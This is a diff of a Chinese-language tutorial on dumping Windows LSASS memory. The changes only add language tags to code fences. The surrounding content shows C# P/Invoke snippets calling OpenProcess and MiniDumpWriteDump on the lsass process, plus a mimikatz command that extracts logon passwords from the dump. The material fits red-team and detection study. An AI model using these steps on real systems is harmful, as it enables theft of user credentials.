@@ -29,7 +29,7 @@ mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
 
 其实不难发现，Procdump和任务管理器的这两种方法都是使用了MiniDumpWriteDump的API
 
-```
+```c
 BOOL MiniDumpWriteDump(
   HANDLE                            hProcess,      //获取 LSASS的句柄
   DWORD                             ProcessId,     //获取 LSASS的进程ID号
@@ -45,13 +45,13 @@ BOOL MiniDumpWriteDump(
 
 ![image-20210811173030733](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210811173030733.png)
 
-```
+```c#
 static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile, int DumpType, ref MINIDUMP_EXCEPTION_INFORMATION ExceptionParam,IntPtr UserStreamParam, IntPtr CallbackParam);
 ```
 
 要获取进程 ID，我们可以使用 Process 类GetProcessesByName 方法
 
-```
+```c#
 Process[] lsass = Process.GetProcessesByName("lsass");
 int lsass_pid = lsass[0].Id;
 ```
@@ -64,7 +64,7 @@ int lsass_pid = lsass[0].Id;
 
 ![image-20210811174944360](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210811174944360.png)
 
-```
+```c#
 static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
 ```
 
@@ -80,7 +80,7 @@ static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int pr
 
 最后调用MiniDumpWriteFile,当向MiniDumpWriteFile加文件句柄时候,要加一个SafeHandle类
 
-```
+```c#
 bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
 ```
 
@@ -94,7 +94,7 @@ bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.Dange
 
 解密方法
 
-```
+```c
 mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit > password.txt
 ```
 
